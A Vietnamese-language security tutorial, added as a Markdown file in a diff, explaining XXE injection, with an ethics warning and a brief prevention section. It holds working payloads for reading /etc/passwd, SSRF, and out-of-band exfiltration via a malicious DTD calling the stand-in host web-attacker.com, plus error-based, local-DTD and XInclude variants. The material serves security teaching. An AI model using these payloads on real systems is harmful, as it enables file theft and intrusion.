@@ -1,0 +1,266 @@
+---
+title: "XML External Entity Injection"
+description: "Phân tích chi tiết về lỗ hổng XML External Entity (XXE) Injection — từ nguyên lý hoạt động, định dạng XML, DTD, đến các biến thể khai thác truy xuất tệp, SSRF, Blind XXE và cách phòng ngừa."
+date: "2026-05-18"
+category: "vulnerability"
+tags: ["xxe", "xml", "injection", "web-security", "ssrf"]
+thumbnail: ""
+external_link: ""
+---
+
+## 1. Tổng quan nhanh
+
+XML External Entity Injection hay XXE là một lỗ hổng bảo mật web cho phép kẻ tấn công can thiệp vào quá trình xử lý dữ liệu XML của ứng dụng. Lỗ hổng này thường cho phép kẻ tấn công xem các tệp tin trên Server và tương tác với bất kỳ hệ thống back-end hoặc hệ thống bên ngoài nào mà ứng dụng có quyền truy cập.
+
+Trong một số tình huống, kẻ tấn công có thể nâng cấp cuộc tấn công XXE để xâm nhập Server nền tảng hoặc cơ sở hạ tầng back-end khác bằng cách tận dụng lỗ hổng XXE để thực hiện các cuộc tấn công SSRF.
+
+![XXE Overview](/images/vulnerabilities/xxe-injection/image1.png)
+
+<Alert type="warning">
+**Cảnh báo Đạo đức:** Các thông tin và kỹ thuật trong bài viết này chỉ nhằm mục đích cung cấp kiến thức bảo mật, phục vụ cho việc nghiên cứu và kiểm thử trên các hệ thống đã được cấp phép. Tuyệt đối không sử dụng cho các mục đích vi phạm pháp luật.
+</Alert>
+
+## 2. Lỗ hổng hoạt động như thế nào?
+
+Để hiểu nguyên lý phát sinh lỗ hổng XXE, chúng ta cần nắm rõ định dạng XML và cách các XML Parser xử lý chúng.
+
+Định dạng XML và DTD XML được thiết kế để lưu trữ và truyền tải dữ liệu. Giống như HTML, XML sử dụng cấu trúc dạng cây gồm các thẻ và dữ liệu. Tuy nhiên, XML không sử dụng các thẻ được xác định trước nên các thẻ có thể được đặt tên tùy ý để mô tả dữ liệu. Trong lịch sử phát triển web, XML từng rất thịnh hành dưới vai trò là định dạng truyền tải dữ liệu, chữ "X" trong công nghệ "AJAX" chính là viết tắt của XML. Mặc dù vậy, sự phổ biến của nó hiện nay đã suy giảm đáng kể và nhường chỗ cho định dạng JSON.
+
+Cấu trúc DTD chứa các khai báo có thể xác định cấu trúc của một tài liệu XML, các loại giá trị dữ liệu mà nó có thể chứa, và các mục khác. DTD được khai báo bên trong phần tử `DOCTYPE` tùy chọn ở đầu tài liệu XML. DTD có thể nằm hoàn toàn bên trong tài liệu, gọi là Internal DTD, hoặc được tải từ nơi khác, gọi là External DTD, hoặc là sự kết hợp của cả hai.
+
+XML Entity và External Entity XML Entity là một cách biểu diễn một mục dữ liệu trong tài liệu XML thay vì sử dụng trực tiếp dữ liệu đó. Có nhiều Entity được tích hợp sẵn vào thông số kỹ thuật của ngôn ngữ XML. Ví dụ, các Entity `&lt;` và `&gt;` đại diện cho các ký tự `<` và `>`. Đây là các siêu ký tự được sử dụng để biểu thị các thẻ XML, do đó nhìn chung chúng phải được biểu diễn bằng các Entity khi chúng xuất hiện bên trong dữ liệu.
+
+XML cho phép định nghĩa các Custom Entity bên trong DTD:
+
+```xml
+<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>
+```
+
+Định nghĩa này có nghĩa là bất kỳ cách sử dụng tham chiếu Entity `&myentity;` nào trong tài liệu XML sẽ được thay thế bằng giá trị đã định nghĩa: "my entity value".
+
+XML External Entity là một loại Custom Entity mà giá trị của nó được định nghĩa ở bên ngoài DTD nơi chúng được khai báo. Khai báo của một External Entity sử dụng từ khóa `SYSTEM` và phải chỉ định một URL để tải giá trị của Entity. URL này có thể sử dụng giao thức HTTP hoặc giao thức file. Ví dụ:
+
+```xml
+<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>
+<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>
+```
+
+XML External Entity cung cấp phương tiện chính làm phát sinh các cuộc tấn công XML External Entity.
+
+Bản chất của lỗ hổng Một số ứng dụng sử dụng định dạng XML để truyền dữ liệu giữa Client và Server. Các ứng dụng này hầu như luôn sử dụng một thư viện tiêu chuẩn hoặc API nền tảng để xử lý dữ liệu XML. Lỗ hổng XXE phát sinh do thông số kỹ thuật XML chứa nhiều tính năng tiềm ẩn rủi ro và các XML Parser tiêu chuẩn vẫn hỗ trợ các tính năng này ngay cả khi ứng dụng không thường xuyên sử dụng chúng.
+
+## 3. Các biến thể và Phân loại
+
+Các cuộc tấn công XXE được phân loại thành các nhóm chính dựa trên mục tiêu và mức độ hiển thị của lỗ hổng:
+
+- Khai thác XXE để truy xuất tệp: Định nghĩa một External Entity chứa nội dung của tệp và trả về trong Response của ứng dụng.
+- Khai thác XXE để thực hiện SSRF: Định nghĩa một External Entity dựa trên URL trỏ đến hệ thống back-end.
+- Blind XXE Out-of-band: Truyền dữ liệu nhạy cảm từ Server ứng dụng đến một hệ thống mà kẻ tấn công kiểm soát.
+- Blind XXE qua thông báo lỗi: Kẻ tấn công kích hoạt thông báo lỗi phân tích cú pháp chứa dữ liệu nhạy cảm.
+
+Ngoài ra, bề mặt tấn công XXE có thể bị ẩn trong các kịch bản không sử dụng XML trực tiếp:
+
+- Tấn công XInclude: Chèn tài liệu phụ vào hệ thống khi kẻ tấn công chỉ kiểm soát một phần dữ liệu được đặt vào tài liệu XML trên Server.
+- Tải lên tệp: Khai thác thông qua các định dạng tệp sử dụng XML như SVG hoặc DOCX.
+- Sửa đổi Content-Type: Ép Server xử lý XML bằng cách đổi loại nội dung của Request POST.
+
+## 4. Hướng dẫn khai thác thực tế
+
+### 4.1. Khai thác XXE để truy xuất tệp
+
+Để thực hiện cuộc tấn công XXE truy xuất một tệp bất kỳ từ hệ thống tệp của Server, bạn cần sửa đổi XML được gửi đi theo hai cách:
+
+- Đưa vào hoặc chỉnh sửa một phần tử `DOCTYPE` định nghĩa một External Entity chứa đường dẫn đến tệp.
+- Chỉnh sửa một giá trị dữ liệu trong XML được trả về trong Response của ứng dụng, để sử dụng External Entity vừa được định nghĩa.
+
+Giả sử ứng dụng kiểm tra mức tồn kho bằng cách gửi XML sau:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck><productId>381</productId></stockCheck>
+```
+
+Kẻ tấn công có thể chèn Payload XXE để lấy tệp `/etc/passwd`:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<stockCheck><productId>&xxe;</productId></stockCheck>
+```
+
+Hệ thống sẽ trả về lỗi kèm theo nội dung tệp vì Entity `&xxe;` được hiển thị trong kết quả: `Invalid product ID: root:x:0:0:root:/root:/bin/bash...`
+
+Lưu ý về kiểm thử hệ thống: Với các lỗ hổng XXE trong thế giới thực, dữ liệu XML gửi đi thường chứa một lượng rất lớn các Data node và bất kỳ Data node nào trong số đó cũng có thể được ứng dụng sử dụng để tạo Response. Để kiểm thử một cách có hệ thống, bạn thường sẽ cần phải kiểm tra từng Data node trong tệp XML một cách độc lập bằng cách chèn Entity đã định nghĩa và quan sát xem nó có xuất hiện trong Response hay không.
+
+### 4.2. Khai thác XXE để thực hiện SSRF
+
+Kẻ tấn công định nghĩa một External Entity bằng URL mục tiêu. Nếu bạn có thể sử dụng Entity đã định nghĩa trong một giá trị dữ liệu được trả về bởi ứng dụng, bạn sẽ có thể xem Response từ URL đó, qua đó tương tác hai chiều với hệ thống back-end. Nếu không, bạn sẽ chỉ có thể thực hiện tấn công Blind SSRF, nhưng vẫn có thể mang lại hậu quả nghiêm trọng.
+
+Ví dụ, External Entity sau sẽ khiến Server thực hiện một Request HTTP đến hệ thống nội bộ:
+
+```xml
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
+```
+
+### 4.3. Khai thác Blind XXE
+
+Lỗ hổng Blind XXE xảy ra khi ứng dụng không trả về giá trị của Entity trong Response, khiến việc truy xuất tệp trực tiếp không thể thực hiện.
+
+Phát hiện bằng Out-of-band (OAST): Định nghĩa một External Entity trỏ đến Server của kẻ tấn công để theo dõi truy vấn DNS và HTTP.
+
+```xml
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
+```
+
+Cuộc tấn công XXE này khiến Server thực hiện một Request HTTP back-end đến URL được chỉ định. Kẻ tấn công có thể theo dõi truy vấn DNS và Request HTTP kết quả, qua đó phát hiện cuộc tấn công XXE đã thành công.
+
+Đôi khi, các cuộc tấn công XXE sử dụng Entity thông thường bị chặn do ứng dụng có cơ chế xác thực Input hoặc do XML Parser đã được tăng cường bảo mật. Trong tình huống này, bạn có thể sử dụng XML Parameter Entity thay thế.
+
+XML Parameter Entity là một loại Entity đặc biệt chỉ có thể được tham chiếu bên trong DTD. Có hai nguyên tắc cơ bản cần nhớ: Thứ nhất, việc khai báo một Parameter Entity bao gồm ký tự phần trăm (`%`) trước tên Entity (`<!ENTITY % myparameterentity "my parameter entity value" >`). Thứ hai, Parameter Entity được tham chiếu bằng ký tự phần trăm thay vì ký hiệu và (`&`) thông thường (`%myparameterentity;`).
+
+Payload OAST sử dụng Parameter Entity:
+
+```xml
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
+```
+
+Trích xuất dữ liệu Out-of-band: Việc phát hiện lỗ hổng Blind XXE thông qua các kỹ thuật Out-of-band là rất tốt, nhưng nó không thực sự chứng minh được cách thức lỗ hổng này có thể bị khai thác. Điều kẻ tấn công thực sự muốn đạt được là trích xuất dữ liệu nhạy cảm.
+
+Điều này có thể được thực hiện qua lỗ hổng Blind XXE, nhưng nó đòi hỏi kẻ tấn công phải lưu trữ một DTD độc hại trên hệ thống mà họ kiểm soát, sau đó gọi External DTD này từ bên trong Payload XXE.
+
+Mã DTD độc hại để trích xuất nội dung tệp `/etc/passwd`:
+
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
+%eval;
+%exfiltrate;
+```
+
+DTD này thực hiện các bước sau:
+- Định nghĩa một XML Parameter Entity có tên là `file`, chứa nội dung của tệp `/etc/passwd`.
+- Định nghĩa một XML Parameter Entity có tên là `eval`, chứa khai báo động của một XML Parameter Entity khác có tên là `exfiltrate`. Entity `exfiltrate` sẽ được xử lý bằng cách thực hiện một Request HTTP đến Web Server của kẻ tấn công, chứa giá trị của Entity `file` bên trong query string của URL.
+- Sử dụng Entity `eval`, điều này khiến quá trình khai báo động của Entity `exfiltrate` được thực hiện.
+- Sử dụng Entity `exfiltrate`, để giá trị của nó được xử lý bằng cách yêu cầu URL đã chỉ định.
+
+Sau đó, kẻ tấn công phải lưu trữ DTD độc hại này trên hệ thống của họ, ví dụ: `http://web-attacker.com/malicious.dtd`. Cuối cùng, kẻ tấn công gửi Payload XXE sau lên Server mục tiêu:
+
+```xml
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
+```
+
+Payload XXE này khai báo một XML Parameter Entity có tên là `xxe` và sau đó sử dụng nó bên trong DTD. Điều này sẽ buộc XML Parser tìm nạp External DTD từ Server của kẻ tấn công và xử lý nó trực tiếp. Các bước định nghĩa bên trong DTD độc hại sau đó sẽ được thực thực thi và tệp `/etc/passwd` được truyền về Server của kẻ tấn công.
+
+Lưu ý: Kỹ thuật này có thể thất bại nếu nội dung tệp chứa các ký tự xuống dòng như trong tệp `/etc/passwd`. Nguyên nhân là do một số XML Parser tìm nạp URL trong định nghĩa External Entity bằng một API có chức năng xác thực các ký tự hợp lệ bên trong URL. Trong tình huống này, kẻ tấn công có thể chuyển sang dùng giao thức FTP thay vì HTTP, hoặc nhắm mục tiêu vào các tệp không chứa ký tự xuống dòng như `/etc/hostname`.
+
+Truy xuất dữ liệu qua thông báo lỗi: Một cách tiếp cận khác là kích hoạt lỗi phân tích cú pháp XML trong đó thông báo lỗi có chứa dữ liệu nhạy cảm mà bạn muốn truy xuất.
+
+Mã DTD độc hại:
+
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+```
+
+DTD này thực hiện các bước sau:
+- Định nghĩa một XML Parameter Entity có tên là `file`, chứa nội dung của tệp `/etc/passwd`.
+- Định nghĩa một XML Parameter Entity có tên là `eval`, chứa khai báo động của một XML Parameter Entity khác có tên là `error`. Entity `error` sẽ được xử lý bằng cách tải một tệp không tồn tại có tên chứa giá trị của Entity `file`.
+- Sử dụng Entity `eval`, điều này khiến quá trình khai báo động của Entity `error` được thực hiện.
+- Sử dụng Entity `error`, để giá trị của nó được xử lý bằng cách cố gắng tải tệp không tồn tại, dẫn đến một thông báo lỗi chứa tên của tệp không tồn tại, cũng chính là nội dung của tệp `/etc/passwd`.
+
+Kết quả trả về sẽ là lỗi: `java.io.FileNotFoundException: /nonexistent/root:x:0...`
+
+Khai thác DTD cục bộ (Local DTD): Kỹ thuật dùng External DTD ở trên rất hiệu quả, nhưng nó không áp dụng được với Internal DTD do quy định nghiêm ngặt của XML không cho phép sử dụng Parameter Entity bên trong định nghĩa của một Parameter Entity khác ở Internal DTD.
+
+Vậy phải làm gì khi các kết nối Out-of-band bị chặn, tức là không thể gọi DTD từ Server của Hacker? Trong tình huống này, kẻ tấn công tái sử dụng một tệp DTD có sẵn trên Server ứng dụng để định nghĩa lại một Entity. Lỗ hổng nằm ở chỗ: Nếu DTD kết hợp cả Internal và External, Internal DTD có thể định nghĩa lại các Entity của External DTD, và khi đó giới hạn cấm sử dụng Parameter Entity lồng nhau sẽ được nới lỏng. Kỹ thuật này được tiên phong bởi Arseniy Sharoglazov và xếp thứ 7 trong top 10 kỹ thuật tấn công web năm 2018.
+
+Ví dụ, giả sử có một tệp DTD trên Server tại vị trí `/usr/local/app/schema.dtd`, và tệp này định nghĩa một Entity tên là `custom_entity`. Kẻ tấn công có thể kích hoạt thông báo lỗi chứa nội dung tệp `/etc/passwd` bằng Payload sau:
+
+```xml
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
+<!ENTITY % custom_entity '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+```
+
+DTD này thực hiện các bước sau:
+- Định nghĩa một XML Parameter Entity có tên là `local_dtd`, chứa nội dung của tệp External DTD tồn tại trên hệ thống tệp của Server.
+- Định nghĩa lại XML Parameter Entity có tên là `custom_entity`, vốn đã được định nghĩa trong tệp External DTD. Entity được định nghĩa lại này chứa Payload khai thác XXE dựa trên lỗi để kích hoạt thông báo lỗi chứa nội dung của tệp `/etc/passwd`.
+- Sử dụng Entity `local_dtd`, để External DTD được xử lý, bao gồm cả giá trị đã được định nghĩa lại của Entity `custom_entity`. Điều này dẫn đến thông báo lỗi mong muốn.
+
+Dò tìm tệp DTD có sẵn để tái sử dụng: Vì cuộc tấn công này đòi hỏi phải tái sử dụng một tệp DTD hiện có trên Server, yêu cầu then chốt là xác định được tệp phù hợp. Điều này khá đơn giản. Vì ứng dụng trả về mọi thông báo lỗi do XML Parser ném ra, bạn có thể dễ dàng liệt kê các tệp DTD cục bộ bằng cách cố gắng tải chúng từ bên trong Internal DTD.
+
+Ví dụ: Các hệ thống Linux sử dụng môi trường GNOME thường có tệp DTD tại `/usr/share/yelp/dtd/docbookx.dtd`. Bạn có thể kiểm tra xem tệp này có tồn tại hay không bằng Payload sau, hệ thống sẽ báo lỗi nếu tệp bị thiếu:
+
+```xml
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+%local_dtd;
+]>
+```
+
+Sau khi đã quét danh sách các tệp DTD phổ biến và tìm được tệp có sẵn, bạn cần có một bản sao của nó để xem xét và tìm ra một Entity có thể ghi đè. Vì nhiều hệ thống chứa tệp DTD là mã nguồn mở, bạn thường có thể dễ dàng tìm và tải các tệp này thông qua công cụ tìm kiếm trên internet.
+
+### 4.4. Bề mặt tấn công XXE ẩn
+
+Bề mặt tấn công đối với các lỗ hổng XXE trong nhiều trường hợp rất rõ ràng, vì lưu lượng HTTP bình thường của ứng dụng đã bao gồm các Request chứa dữ liệu ở định dạng XML. Trong các trường hợp khác, bề mặt tấn công ít rõ ràng hơn. Tuy nhiên, nếu bạn tìm đúng chỗ, bạn sẽ tìm thấy bề mặt tấn công XXE trong cả những Request không chứa bất kỳ mã XML nào.
+
+Tấn công XInclude: Khi dữ liệu do Client gửi được nhúng vào một tài liệu XML trên Server, ví dụ như Request SOAP, kẻ tấn công không thể sửa đổi phần tử `DOCTYPE`. XInclude là một phần của thông số kỹ thuật XML cho phép xây dựng một tài liệu XML từ các tài liệu phụ. Kẻ tấn công có thể đặt Payload XInclude vào bất kỳ giá trị dữ liệu nào.
+
+```xml
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo>
+```
+
+Tải lên tệp: Nhiều định dạng tệp hình ảnh hoặc tài liệu như SVG, DOCX thực chất được cấu trúc bằng XML. Kẻ tấn công tải lên một tệp SVG chứa Payload XXE độc hại để khai thác thư viện xử lý hình ảnh của Server.
+
+Sửa đổi Content-Type: Nếu ứng dụng mong đợi Request POST dạng `application/x-www-form-urlencoded` nhưng lại chấp nhận xử lý dạng XML, kẻ tấn công có thể thay đổi Content-Type và gửi Payload XML.
+
+Thay đổi Request gốc:
+
+```http
+POST /action HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 7
+
+foo=bar
+```
+
+Thành Request chứa XML:
+
+```http
+POST /action HTTP/1.0
+Content-Type: text/xml
+Content-Length: 52
+
+<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
+```
+
+## 5. Checklist Kiểm thử và Nhận diện
+
+Phần lớn các lỗ hổng XXE có thể được tìm thấy nhanh chóng và đáng tin cậy bằng máy quét lỗ hổng web của Burp Suite. Quy trình kiểm tra thủ công bao gồm:
+
+- Kiểm tra truy xuất tệp: Định nghĩa một External Entity trỏ đến một tệp hệ điều hành đã biết và sử dụng Entity đó trong dữ liệu được trả về.
+- Kiểm tra Blind XXE: Định nghĩa một External Entity trỏ đến hệ thống kiểm soát bằng Burp Collaborator để theo dõi tương tác mạng.
+- Kiểm tra XInclude: Sử dụng Payload XInclude trên các luồng nhận Input không phải định dạng XML thuần túy để truy xuất tệp hệ điều hành.
+- Kiểm tra Content-Type: Sửa đổi Content-Type thành `text/xml` trên các Request POST để phát hiện bề mặt tấn công ẩn.
+- Kiểm tra các lỗ hổng khác: XML chỉ là một định dạng truyền tải dữ liệu. Hãy đảm bảo kiểm tra mọi tính năng dựa trên XML để tìm các lỗ hổng khác như XSS và SQL Injection. Sử dụng các chuỗi thoát XML để làm rối Payload nhằm lách qua các lớp phòng thủ yếu.
+
+## 6. Cách phòng ngừa và Khắc phục
+
+Hầu như tất cả các lỗ hổng XXE đều phát sinh do thư viện XML Parser của ứng dụng hỗ trợ các tính năng XML tiềm ẩn rủi ro mà ứng dụng không cần hoặc không có ý định sử dụng.
+
+Cách dễ nhất và hiệu quả nhất để ngăn chặn các cuộc tấn công XXE là vô hiệu hóa các tính năng đó. Thông thường, việc vô hiệu hóa phân giải External Entity và vô hiệu hóa hỗ trợ XInclude là đủ. Việc này có thể được thực hiện thông qua các tùy chọn cấu hình hoặc ghi đè hành vi mặc định bằng mã lập trình tùy thuộc vào tài liệu của API hoặc thư viện XML Parser đang được sử dụng.
+
+## Tham khảo
+
+- [PortSwigger — XML External Entity (XXE) Injection](https://portswigger.net/web-security/xxe)
+- [OWASP — XML External Entity Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
